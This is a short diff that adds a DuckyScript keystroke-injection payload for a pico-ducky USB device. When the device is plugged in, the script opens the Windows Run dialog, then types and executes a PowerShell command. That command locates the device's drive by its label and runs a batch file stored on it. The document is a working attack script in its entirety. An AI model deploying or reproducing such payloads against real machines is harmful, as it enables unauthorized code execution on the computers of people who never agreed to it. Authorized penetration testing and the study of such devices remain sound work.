@@ -1,0 +1,5 @@
+GUI r
+DELAY 100
+REM make sure your pico-ducky is labeled "_" so the following PS command will find its drive letter
+STRING powershell -NoP ".((gwmi win32_volume -f 'label=''_''').Name+'\fd\payloads\s1.cmd')"
+ENTER
